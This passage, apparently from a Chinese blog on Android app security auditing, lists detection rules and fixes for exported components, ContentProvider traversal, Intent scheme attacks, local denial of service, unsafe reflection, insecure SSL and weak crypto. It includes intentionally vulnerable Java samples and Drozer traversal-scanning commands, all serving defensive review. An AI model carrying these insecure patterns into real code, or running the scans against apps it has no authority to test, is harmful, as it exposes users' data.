Debuggable检测</h3><p>在AndroidManifest.xml中定义Debuggable项，如果该项被打开，app存在被恶意程序调试的风险，可能导致泄露敏感信息等问题。默认值 false</p><p>风险等级：<code>高危</code></p><h3 id="非必要权限检测"><a href="#非必要权限检测" class="headerlink" title="非必要权限检测"></a>非必要权限检测</h3><p>检测在生产环境中不必要使用的权限</p><ul><li><code>android.permission.ACCESS_MOCK_LOCATION</code>该权限是使在模拟器中使用，用于获取模拟定位信息，安装在用户手机中的应用不应该申请该权限。</li></ul><p>风险等级：<code>提醒</code></p><h3 id="app最低版本检查"><a href="#app最低版本检查" class="headerlink" title="app最低版本检查"></a>app最低版本检查</h3><p>罗列出跟最低版本相关的漏洞和bug，提醒开发者注意自己应用支持的最低版本的系统可能存在的问题</p><p>检测app/build.gradle中的minSdkVersion确定APP所支持的最低版本的系统API，对应到相应的Android版本上。</p><h2 id="组件安全检测"><a href="#组件安全检测" class="headerlink" title="组件安全检测"></a>组件安全检测</h2><h3 id="Activity组件导出检测"><a href="#Activity组件导出检测" class="headerlink" title="Activity组件导出检测"></a>Activity组件导出检测</h3><p>Activity组件对外暴露会导致数据泄露和恶意的dos攻击</p><p><strong>风险等级</strong>：提醒</p><p><strong>检测规则 ：</strong></p><ol><li>先检查组件的android:exported属性的值，若为true或者未设定该属性的值，则继续第二步操作；若为false，则是安全的</li><li>若组件含有标签，即使未设置exported属性，默认也会设置为true，若组件不含有标签，则未设置exported属性值，默认会设置为true，如果是false则是安全的，若是true，则进行第三步</li><li>判断android:permission属性的值，空，normal，dangerous是不安全的，signature、signatureOrSystem是安全的。</li></ol><p><strong>建议：</strong></p><ul><li>最小化组件暴露。对不会参与跨应用调用的组件添加<code>android:exported=false</code>属性</li><li>设置组件访问权限。对跨应用间调用的组件或者公开的receiver、service、activity和activity-alias设置权限，同时将权限的protectionLevel设置为<code>signature</code>或<code>signatureOrSystem</code></li><li>组件传输数据验证。对组件之间，特别是跨应用的组件之间的数据传入与返回做验证和增加异常处理，防止恶意调试数据传入，更要防止敏感数据返回</li></ul><h3 id="service组件导出检测"><a href="#service组件导出检测" class="headerlink" title="service组件导出检测"></a>service组件导出检测</h3><p>Service组件对外暴露会导致数据泄露和恶意的dos攻击。</p><p><strong>风险等级</strong>： <code>提醒</code></p><p>检测规则：</p><p>规则同1</p><p><strong>建议</strong>：</p><ul><li>最小化组件暴露。对不会参与跨应用调用的组件添加<code>android:exported=false</code>属性</li><li>设置组件访问权限。对跨应用间调用的组件或者公开的receiver、service、activity和activity-alias设置权限，同时将权限的protectionLevel设置为<code>signature</code>或<code>signatureOrSystem</code></li><li>组件传输数据验证。对组件之间，特别是跨应用的组件之间的数据传入与返回做验证和增加异常处理，防止恶意调试数据传入，更要防止敏感数据返回</li></ul><h3 id="Receiver组件导出检测"><a href="#Receiver组件导出检测" class="headerlink" title="Receiver组件导出检测"></a>Receiver组件导出检测</h3><p>Receiver组件对外暴露会导致数据泄露和恶意的dos攻击。</p><p>风险等级： <code>提醒</code></p><p>检测规则：</p><p>规则同1</p><p>建议：</p><ul><li>最小化组件暴露。对不会参与跨应用调用的组件添加<code>android:exported=false</code>属性</li><li>设置组件访问权限。对跨应用间调用的组件或者公开的receiver、service、activity和activity-alias设置权限，同时将权限的protectionLevel设置为<code>signature</code>或<code>signatureOrSystem</code></li><li>组件传输数据验证。对组件之间，特别是跨应用的组件之间的数据传入与返回做验证和增加异常处理，防止恶意调试数据传入，更要防止敏感数据返回</li></ul><h3 id="Provider组件导出检测"><a href="#Provider组件导出检测" class="headerlink" title="Provider组件导出检测"></a>Provider组件导出检测</h3><p>provider组件导出可能会带来信息泄露隐患。API Level在17以下的所有应用的<code>android:exported</code>属性默认值为true，17及以上默认值为false。</p><p>风险等级：<code>提醒</code></p><p>检测规则：</p><p>规则同1</p><p>建议：</p><ul><li>最小化组件暴露。对不会参与跨应用调用的组件添加<code>android:exported=false</code>属性</li><li>设置组件访问权限。对导出的provider组件设置权限，同时将权限的protectionLevel设置为<code>signature</code>或<code>signatureOrSystem</code></li><li>由于contentprovider无法在android2.2（API-8）申明为私有。故建议将<code>minSdkVersion</code>设为8以上。</li></ul><h3 id="ContentProvider目录遍历漏洞检测"><a href="#ContentProvider目录遍历漏洞检测" class="headerlink" title="ContentProvider目录遍历漏洞检测"></a>ContentProvider目录遍历漏洞检测</h3><p>该漏洞由于Content Provider组件暴露，没有对这个组件访问权限进行限制且对Uri路径没有进行过滤，攻击者通过Content Provider实现的OpenFile接口进行攻击，通过<code>../</code>的方式访问任意的目录文件，造成隐私泄露</p><p><strong>检测等级</strong>：提醒</p><p><strong>检测方法</strong>：</p><ol><li>找到导出的provider组件</li><li>使用Android安全分析框架Drozer动态分析APK，需要安装安卓模拟器（安装了<em>Genymotion</em>，基于X86 + ARM支持包）</li><li>、使用adb 进行端口转发，转发到Drozer使用的端口31415<br>adb forward tcp:31415 tcp:31415</li><li>在安卓设备上开启Drozer Agent 在PC上启动Drozer<br><code>drozeer console connect</code></li><li>在Drozer控制台中使用命令，分析目标apk是否存在目录遍历漏洞<br><code>run scanner.provider.traversal -a &lt;package0-name&gt;</code></li></ol><p><strong>建议</strong>：</p><ul><li>将不必要的Connect Provider设置为不可导出</li><li>由于Android组件Content Provider无法在Android 2.2(API Level 8)系统上设置不可导出，因此如果希望Content Provider不可导出，建议声明的最低SDK版本为8以上版本；由于API Level 17以下的所有应用的<code>android:exported</code>默认值都为true，因此如果应用的Content Provider不必要导出，建议显示设置注册的Content Provider组件的<code>android:exported</code>属性为false；、</li><li>去除没有必要的OpenFile()接口</li><li>如果应用的Content Provider组件没有必要实现<code>openFile()</code>接口，阿里聚安全建议移除该Content Provider的不必要的<code>openFile()</code>接口</li><li>过滤限制跨域访问，对访问的目标文件的路径进行有效判断</li><li>使用<code>Uri.decode()</code>先对Content Query Uri进行解码后，在过滤如可通过<code>../</code>实现任意可读文件的访问的Uri字符串</li><li>设置权限来进行内部应用通过Content Provider的数据共享</li><li>使用签名验证来控制Content Provider共享数据的访问权限，如设置<code>protectionLevel=signature或signatureOrSystem</code></li><li><p>提供asset文件时注意权限保护</p></li><li><p>公开的content provider确保不存储敏感数据</p></li></ul><h3 id="Provider：grant-uri-permission属性检测"><a href="#Provider：grant-uri-permission属性检测" class="headerlink" title="Provider：grant-uri-permission属性检测"></a>Provider：grant-uri-permission属性检测</h3><p>grant-uri-permission若设置为true，可被其他程序员通过uri访问到content provider内容，容易造成信息泄露，默认是false</p><p>如果一个Provider是非导出组件的时候，当进行文件共享的时候需要在Intent中加入Grant相关的flags</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">static</span> <span class="keyword">final</span> <span class="type">int</span> FLAG_GRANT_READ_URI_PERMISSION = <span class="number">0x00000001</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">static</span> <span class="keyword">final</span> <span class="type">int</span> FLAG_GRANT_WRITE_URI_PERMISSION = <span class="number">0x00000002</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">static</span> <span class="keyword">final</span> <span class="type">int</span> FLAG_GRANT_PERSISTABLE_URI_PERMISSION = <span class="number">0x00000040</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">static</span> <span class="keyword">final</span> <span class="type">int</span> FLAG_GRANT_PREFIX_URI_PERMISSION = <span class="number">0x00000080</span></span><br></pre></td></tr></table></figure><p>这样startActivity内部会判断，如果含有这些Grant flag，将会进行临时性的Uri授权，也包括临的将provider组件export给Intent的目标应用。</p><p><strong>风险等级</strong>：提醒</p><p><strong>问题实例：</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">provider</span></span></span><br><span class="line"><span class="tag"><span class="attr">android:grantUriPermissions</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">...</span><br><span class="line"><span class="tag">&lt;/<span class="name">provider</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>建议：</strong></p><p>如无需对外提供数据，则将content provider的<code>android:grantUriPermissions</code>设置为false。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">provider</span></span></span><br><span class="line"><span class="tag"><span class="attr">android:grantUriPermissions</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">...</span><br><span class="line"><span class="tag">&lt;/<span class="name">provider</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Intent-Based攻击检测"><a href="#Intent-Based攻击检测" class="headerlink" title="Intent-Based攻击检测"></a>Intent-Based攻击检测</h3><p>在AndroidManifest文件中定义了android.intent.category .BROWSABLE属性的组件，可以通过浏览器唤起，这会导致远程命令执行漏洞攻击</p><p><strong>风险等级</strong>：低危</p><p><strong>问题实例</strong>：Activity只有配置了category filter才有被android.intent.category.BROWSABLE通过这种方式在浏览器中打开。通过扫描Manifest中的所有组件，检测出所有组件中的intent-filter带有<code>&lt;category android:name=&quot;android.intent.category.BROWSABLE&quot;/&gt;</code>属性的，将其标注为问题代码代码段，并报出低危风险的提示。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;.MainActivity&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.BROWSABLE&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure><p> <strong>建议</strong>：</p><ul><li>app中任何接收外部输入数据的地方都是潜在的攻击点，<strong>检查并过滤</strong>来自网页的参数</li><li>不要通过网页传输敏感信息，有的网站为了引导已经登录用户到app上使用，会使用脚本动态的生成URL Scheme的参数，其中包括用户名，密码或者登录态token登敏感信息，让用户打开app直接就登录了，恶意应用也可以注册相同的URL Scheme来截取这些敏感信息，Android系统会让用户选择使用哪一个应用打开链接，但是如果用户不注意，就会使用恶意应用打开，导致敏感信息泄露或者其他风险。</li></ul><h3 id="Intent-Scheme-URL漏洞攻击"><a href="#Intent-Scheme-URL漏洞攻击" class="headerlink" title="Intent Scheme URL漏洞攻击"></a>Intent Scheme URL漏洞攻击</h3><p>Intent Scheme URL是一种特殊的URL格式，用来通过web页面启动已经安装应用的Activity组件，大多数主流浏览器都支持此功能。</p><p>Android Browser的攻击手段 ==》Intent Scheme URLs攻击。这种攻击方式利用了浏览器保护措施不足，通过浏览器作为桥梁间接实现Intent-Based攻击。相比于普通的Intent-Based攻击，这种方式具有隐蔽性。</p><p>如果app中，没有检查获取到的load_url的值，攻击者可以构造钓鱼网站，诱导用户点击加载，就可以盗取用户信息。所以，对Intent URI的的处理不当时，就会导致基于Intent的攻击</p><p><strong>风险等级</strong>：高危</p><p><strong>问题实例</strong>：</p><p>如果浏览器支持Intent Scheme URI语法，一般会分三个步骤进行处理</p><ol><li>利用Intent.parseUri解析uri，获取原始的Intent对象</li><li>对intent对象设置过滤规则</li><li>通过Context.startActivityIfNeeded或者Context.startActivity发送intent，其中第二步起关键作用，过滤规则缺失或者存在缺陷都会导致Intent Scheme URL攻击</li></ol><p>关键在于Intent.parseUri函数，比较安全的使用Intent Scheme URI方法是，如果使用了Intent.parseUri函数，获取的intent对象必须严格过滤，intent至少包含以下三个策略</p><ul><li>addCategory(“android.intent.category.BROWSABLE”)</li><li>setComponent(null)</li><li>setSelector(null)</li></ul><p>通过扫描出所有调用了Intent.parseUri方法的路径，并检测是否使用了上述三个策略，若都是用了则安全，否则高危</p><p>Intent.parseUri函数返回的Intent对象需要按照以下方式进行实现，才可以认为是安全的。</p><p><strong>建议</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将intent的URI(intent scheme URL)转换为intent对象</span></span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> Intent.parseUri(uri);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 禁止在没有设置可浏览的目录(BROWSABLE category)的时候启动活动</span></span><br><span class="line">intent.addCategory(<span class="string">&quot;android.intent.category.BROWSABLE&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 禁止显式调用(explicit call)</span></span><br><span class="line">intent.setComponent(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 禁止intent的选择器(selector)</span></span><br><span class="line">intent.setSelector(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过intent启动活动</span></span><br><span class="line">context.startActivityIfNeeded(intent, -<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="应用本地拒绝服务漏洞检测"><a href="#应用本地拒绝服务漏洞检测" class="headerlink" title="应用本地拒绝服务漏洞检测"></a>应用本地拒绝服务漏洞检测</h3><p>Android系统提供了Activity，Service，Broadcast Receiver等组件，并且提供了Intent机制来协助应用间的交互和通讯，Intent负责对应用中一次操作的动作，动作设计的数据，附加数据进行描述，Andorid系统根据此Intent的描述，负责找到对应的组件，将Intent传递给调用的组件，并完成组件的调用。</p><p>Andorid应用本地拒绝服务漏洞源于程序没有对Intent.GetxxxExtra()获取的异常或者畸形数据处理时没有进行异常捕获，从而导致攻击者可通过向受害者应用发送此类空数据，异常或者畸形数据来达到使该应用Crash的目的，简单的说就是攻击者通过Inent发送的空数据，异常或者畸形数据给受害者应用，导致其崩溃</p><p><strong>风险等级：</strong>低危</p><p><strong>问题实例</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//源于程序没有对getAction()等获取到的数据进行空指针判断，从而导致了空指针异常导致应用崩溃</span></span><br><span class="line"><span class="type">Intent</span> <span class="variable">i</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (i.getAction().equals(<span class="string">&quot;TestForNullPointerException&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    Log.d(<span class="string">&quot;TAG&quot;</span>, <span class="string">&quot;Test for Android Refuse Service Bug&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> Exception &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">Intent</span> <span class="variable">abc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line"><span class="type">Intent</span> <span class="variable">kkk</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line"><span class="keyword">if</span> (abc.getAction().equals(<span class="string">&quot;TestForNullPointerException&quot;</span>)) &#123;</span><br><span class="line">    Log.d(<span class="string">&quot;TAG&quot;</span>, <span class="string">&quot;Test for Android Refuse Service Bug&quot;</span>);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">//源于程序没有对getSerializableExtra()等获取到的数据进行类型判断而进行强制类型转换，从而导致类型转换异常导致拒绝服务漏洞</span></span><br><span class="line"><span class="type">Intent</span> <span class="variable">a</span> <span class="operator">=</span> getIntent();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">test</span> <span class="operator">=</span> (String) a.getSerializableExtra(<span class="string">&quot;serializable_key&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> Exception &#123;</span><br><span class="line">    <span class="comment">//针对异常进行操作</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//源于程序没有对getIntegerArrayListExtra()等获取到的数据数组元素大小判断，导致数组访问越界而造成拒绝服务漏洞</span></span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> getIntent();</span><br><span class="line"></span><br><span class="line">ArrayList&lt;Integer&gt; intArray = intent.getIntegerArrayListExtra(<span class="string">&quot;user_id&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (intArray != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">        intArray.get(i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//源于程序没有找到从getSerializableExtra()获取到的序列化对象的类定义，因此导致发生类未定义的异常导致拒绝服务漏洞</span></span><br><span class="line">a.getSerializableExtra(<span class="string">&quot;key&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="manifest中定义组件为实现检测"><a href="#manifest中定义组件为实现检测" class="headerlink" title="manifest中定义组件为实现检测"></a>manifest中定义组件为实现检测</h3><p>在manifest文件中定义的组件导出，且没有代码实现，则攻击者可以通过ddos攻击导致app崩溃</p><p><strong>风险等级：</strong>中危</p><p><strong>问题实例：</strong></p><p>首先获取app源码中所有类的路径(包名+类名)，然后检测manifest中声明的所有组件是否存在于类路径中即可</p><p><strong>建议：</strong></p><p>删除manifest文件中无效的导出组件</p><h3 id="Debug或Test敏感测试组件泄露检测"><a href="#Debug或Test敏感测试组件泄露检测" class="headerlink" title="Debug或Test敏感测试组件泄露检测"></a>Debug或Test敏感测试组件泄露检测</h3><p>一些app在正式发布之前，为了方便调试app，都会在app里集成一些调式或者测试界面，这些测试界面可能包含敏感信息。</p><p><strong>风险等级：</strong>低危或中危</p><p><strong>问题实例</strong></p><p>遍历manifest文件中所有组件的名称，找出所有带有debug或者test等测试字样的关键字组件，并根据组件的intent-filter属性构造intent发送让组件弹出进行检测</p><p><strong>建议</strong></p><p>正式发布前移除所有测试组件</p><h3 id="Intent不安全反射风险检测"><a href="#Intent不安全反射风险检测" class="headerlink" title="Intent不安全反射风险检测"></a>Intent不安全反射风险检测</h3><p>通过Intent接收的Extra参数来构造反射对象会导致从不受信任的源加载类，攻击者可以通过巧妙地构造达到加载其他类的目的、</p><p><strong>风险等级：</strong>低危</p><p><strong>问题实例</strong></p><p>Step1：检测出导出的组件</p><p>Step2：在导出的组件下，检测两个关键函数，分别是：getIntent()和Class.forName(“….”)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SecondActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line"><span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">setContentView(R.layout.activity_second);</span><br><span class="line"><span class="comment">//这里的intent使用了getStringExtra方法加载了一个名称为className的类</span></span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> getIntent();</span><br><span class="line"><span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> intent.getStringExtra(<span class="string">&quot;className&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> intent.getStringExtra(<span class="string">&quot;methodName&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">Class&lt;?&gt; clz = <span class="literal">null</span>;</span><br><span class="line"><span class="comment">//尝试以反射的方式构造className的实例</span></span><br><span class="line"> clz = Class.forName(className);</span><br><span class="line"><span class="type">Date</span> <span class="variable">object</span> <span class="operator">=</span> (Date) clz.newInstance();</span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clz.getMethod(methodName);</span><br><span class="line">Toast.makeText(getApplicationContext(), method.invoke(object, <span class="literal">null</span>) + <span class="string">&quot;======&quot;</span>, Toast.LENGTH_LONG).show();</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逆向后对应的smali代码如下：</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">.</span>..<span class="built_in"></span></span><br><span class="line"><span class="built_in">invoke-virtual </span>&#123;p0&#125;, <span class="class">Lcom/bug/intent/reflection/SecondActivity;</span>-&gt;getIntent()<span class="class">Landroid/content/Intent;</span></span><br><span class="line"><span class="keyword">.</span>..<span class="built_in"></span></span><br><span class="line"><span class="built_in">invoke-static </span>&#123;v0&#125;, <span class="class">Ljava/lang/Class;</span>-&gt;forName(<span class="class">Ljava/lang/String;</span>)<span class="class">Ljava/lang/Class;</span></span><br><span class="line"><span class="keyword">.</span>..</span><br></pre></td></tr></table></figure><p><strong>建议：</strong></p><ul><li>不要通过Intent接收的Extra传播的反射函数</li><li>将接受反射的组件设置为非导出组件</li></ul><h2 id="WebView组件安全"><a href="#WebView组件安全" class="headerlink" title="WebView组件安全"></a>WebView组件安全</h2><h2 id="SQLite安全"><a href="#SQLite安全" class="headerlink" title="SQLite安全"></a>SQLite安全</h2><h2 id="网络通信安全"><a href="#网络通信安全" class="headerlink" title="网络通信安全"></a>网络通信安全</h2><h3 id="SSL连接检测"><a href="#SSL连接检测" class="headerlink" title="SSL连接检测"></a>SSL连接检测</h3><p>URL没有使用SSL安全协议</p><p><strong>风险等级：</strong>提示</p><p>问题实例：</p><p>所有不使用https的url字符串常量</p><p><strong>建议</strong>：</p><ul><li>如果使用https协议加载url，应用进行证书校验，防止访问的页面被篡改挂马</li><li>如果使用http协议加载url，应进行白名单过滤，完整性校验等防止访问的页面被篡改</li><li>如果加载本地html，应将html文件内置在apk中，以及进行对html页面完整性的校验</li></ul><h3 id="SSL不安全组件检测"><a href="#SSL不安全组件检测" class="headerlink" title="SSL不安全组件检测"></a>SSL不安全组件检测</h3><p>SSLCertificateSocketFactory#getInsecure方法无法执行SSL验证检查，使得网络通信遭受中间人攻击。</p><p><strong>风险等级：</strong>提示</p><p><strong>问题示例：</strong></p><p>检测是否使用了SSLCertificateSocketFactory#getInsecure方法</p><p><strong>建议</strong>：</p><p>移除SSLCertificateSocketFactory#getInsecure方法</p><h3 id="HttpHost检测"><a href="#HttpHost检测" class="headerlink" title="HttpHost检测"></a>HttpHost检测</h3><p><code>HttpHost target = new HttpHost(uri.getHost(), uri.getPort(), HttpHost.DEFAULT_SCHEME_NAME);</code></p><p>HttpHost.DEFAULT_SCHEME_NAME默认是http，不安全。</p><p><strong>问题示例：</strong></p><p>检测HttpHost使用的参数是否是<code>http</code></p><p><strong>建议</strong>：</p><p>改成使用<code>https</code></p><h3 id="HttpURLConnection漏洞检测"><a href="#HttpURLConnection漏洞检测" class="headerlink" title="HttpURLConnection漏洞检测"></a>HttpURLConnection漏洞检测</h3><p>在<code>Android 2.2</code>版本之前，HttpURLConnection一直存在着一些令人厌烦的bug。比如说对一个可读的InputStream调用close()方法时，就有可能会导致连接池失效了。</p><p><strong>风险等级</strong>：<code>低危</code></p><p><strong>问题示例：</strong></p><p>判断使用HttpURLConnection是否进行了版本判断</p><p><strong>建议</strong>：</p><p>判断Android版本，并设置http.keepAlive为false。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">disableConnectionReuseIfNecessary</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 解决Android Froyo(Androdi 2.2)版本之前，在HTTP连接重用时会出现的BUG</span></span><br><span class="line">    <span class="keyword">if</span> (Integer.parseInt(Build.VERSION.SDK) &lt; Build.VERSION_CODES.FROYO) &#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;http.keepAlive&quot;</span>, <span class="string">&quot;false&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="网络端口开放威胁检测"><a href="#网络端口开放威胁检测" class="headerlink" title="网络端口开放威胁检测"></a>网络端口开放威胁检测</h3><p>Android应用通常使用PF_UNIX，PF_INET，PF_NETLINK等不同domain的socket来进行本地IPC或者远程网络通信，这些暴露在socket代表了潜在的本地或者远程攻击面，历史上也出现过不少利用socket进行拒绝服务，root提权或者远程命令执行的案例，特别是PF_INET类型的网络socket，可以通过网络与Android应用通信，其原本用于linux环境下开放网络服务，由于缺乏对网络调用者身份或者本地调用者id，permission等细粒度的安全检查机制，在实现不当的情况下，可以突破Android沙箱限制，以被攻击应用的权限执行命令，通常出现比较严重的漏洞</p><p><strong>风险等级：</strong>低危</p><p><strong>建议</strong></p><p>直接传递命令字或者间接处理有敏感信息或操作时，避免使用socket实现，使用身份认证，鉴权，参数校验等安全要素。</p><h2 id="弱加密风险检测"><a href="#弱加密风险检测" class="headerlink" title="弱加密风险检测"></a>弱加密风险检测</h2><h3 id="DES弱加密算法风险检测"><a href="#DES弱加密算法风险检测" class="headerlink" title="DES弱加密算法风险检测"></a>DES弱加密算法风险检测</h3><p>安全性要求高的应用程序必须避免使用不安全的或者强度弱的加密算法。例如，数据加密标准算法DES(密钥默认是56位，算法半公开，迭代次数少)是极度不安全的。</p><p><strong>风险等级：</strong>低危</p><p><strong>问题示例</strong>：</p><p>使用des弱加密算法，风险代码样例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="type">SecretKeySpec</span> <span class="variable">key</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(rawKeyData, <span class="string">&quot;DES&quot;</span>);</span><br><span class="line"><span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;DES/ECB/PKCS5Padding&quot;</span>);</span><br><span class="line">cipher.init(Cipher.DECRYPT_MODE, key);</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>通过正则表达式”DES/(\w){3}/.+Padding”匹配字符串常量。</p><p><strong>建议：</strong></p><p>建议使用安全性更高的AES加密算法</p><h3 id="不安全的密钥长度风险检测"><a href="#不安全的密钥长度风险检测" class="headerlink" title="不安全的密钥长度风险检测"></a>不安全的密钥长度风险检测</h3><p>在使用RSA加密时，加密长度小于512bit，小于512bit的密钥很容易被破解，计算出密钥</p><p><strong>风险等级：</strong>低危</p><p><strong>问题示例：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> KeyPair <span class="title function_">getRSAKey</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchAlgorithmException &#123;</span><br><span class="line">    <span class="type">KeyPairGenerator</span> <span class="variable">keyGen</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;RSA&quot;</span>);</span><br><span class="line">    keyGen.initialize(<span 